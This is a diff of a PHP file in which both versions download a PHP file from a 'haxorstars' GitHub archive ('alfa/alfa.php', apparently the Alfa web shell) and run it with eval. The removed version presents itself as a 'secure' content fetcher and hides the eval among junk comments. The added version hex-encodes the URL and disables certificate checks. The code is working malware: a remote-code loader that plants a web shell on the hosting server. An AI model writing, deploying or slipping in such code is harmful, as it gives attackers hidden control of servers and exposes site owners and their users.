@@ -1,104 +1,84 @@
 <?php
-/**
- * Class RemoteContentFetcher
- * Handles secure remote content fetching with proper validation
- * By NuLz | Haxorstars
- * github.com/haxorstars
- */
-class RemoteContentFetcher {
+
+class RemotePHPExecutor
+{
     private $url;
-    private $options;
-    
-    /**
-     * Constructor
-     * @param string $url Remote URL to fetch
-     */
-    public function __construct(string $url) {
-        $this->url = filter_var($url, FILTER_VALIDATE_URL);
-        $this->options = [
-            'ssl_verify' => true,
-            'timeout' => 30,
-            'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0'
-        ];
+    private $code = null;
+    private $error = null;
+
+    public function __construct($url)
+    {
+        $this->url = $url;
+        $this->fetchCode();
     }
-    
-    /**
-     * Set custom cURL options
-     * @param array $options
-     */
-    public function setOptions(array $options): void {
-        $this->options = array_merge($this->options, $options);
-    }
-    
-    /**
-     * Fetch content from remote URL
-     * @return string|false
-     * @throws Exception
-     */
-    public function fetch() {
-        if (!$this->url) {
-            throw new Exception('Invalid URL provided');
+
+    private function fetchCode()
+    {
+        $code = $this->fetchUsingCurl();
+
+        if ($code === false) {
+            $code = $this->fetchUsingFileGetContents();
         }
-        
+
+        if ($code === false) {
+            $this->error = "Gagal mengambil konten dari URL: {$this->url}";
+            return;
+        }
+
+        $this->code = $code;
+    }
+
+    private function fetchUsingCurl()
+    {
+        if (!function_exists('curl_init')) {
+            return false;
+        }
+
+        $ch = curl_init($this->url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+        ]);
+        $result = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        return ($httpCode === 200 && $result !== false) ? $result : false;
+    }
+
+    private function fetchUsingFileGetContents()
+    {
+        $context = stream_context_create([
+            "http" => ["follow_location" => 1, "timeout" => 10],
+            "https" => ["verify_peer" => false, "verify_peer_name" => false]
+        ]);
+
+        return @file_get_contents($this->url, false, $context);
+    }
+
+    public function render()
+    {
+        if (empty($this->code)) {
+            return $this->error ?: "Tidak ada konten untuk dijalankan.";
+        }
+
         try {
-            $ch = curl_init();
-            
-            curl_setopt_array($ch, [
-                CURLOPT_URL => $this->url,
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_FOLLOWLOCATION => true,
-                CURLOPT_SSL_VERIFYPEER => $this->options['ssl_verify'],
-                CURLOPT_TIMEOUT => $this->options['timeout'],
-                CURLOPT_USERAGENT => $this->options['user_agent']
-            ]);
-            
-            $content = curl_exec($ch);
-            $error = curl_error($ch);
-            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            
-            curl_close($ch);
-            
-            if ($error) {
-                throw new Exception("cURL Error: $error");
-            }
-            
-            if ($httpCode !== 200) {
-                throw new Exception("HTTP Error: $httpCode");
-            }
-            
-            return $this->validateContent($content);
-            
-        } catch (Exception $e) {
-            error_log("RemoteContentFetcher Error: " . $e->getMessage());
-            throw $e;
+            ob_start();
+            eval("?>".$this->code);
+            return ob_get_clean();
+        } catch (Exception $e) { // Throwable baru PHP 7+, Exception aman untuk versi lama
+            return "Kesalahan saat mengeksekusi konten: " . $e->getMessage();
         }
-    }
-    
-    /**
-     * Validate fetched content
-     * @param string $content
-     * @return string
-     */
-    private function validateContent($content) {
-        if (empty($content)) {
-            throw new Exception('Empty content received');
-        }
-        
-        return $content;
     }
 }
 
-try {
-    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa.php');
-    $fetcher->setOptions([
-        'timeout' => 60,
-        'ssl_verify' => true
-    ]);
-    
-    $content = $fetcher->fetch();
-    /*555555*/eval/*555555*/("?>".$content)/****#****/;
-    
-} catch (Exception $e) {
-    echo "Error: " . $e->getMessage();
+$this_data = ['68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6861786F7273746172732F617263686976652F6D61696E2F616C66612F616C66612E706870'];
+foreach ($this_data as $key) {
+    $nulzganteng = hex2bin($key);
+    $remote = new RemotePHPExecutor($nulzganteng);
+    echo $remote->render();
 }
+
 ?>
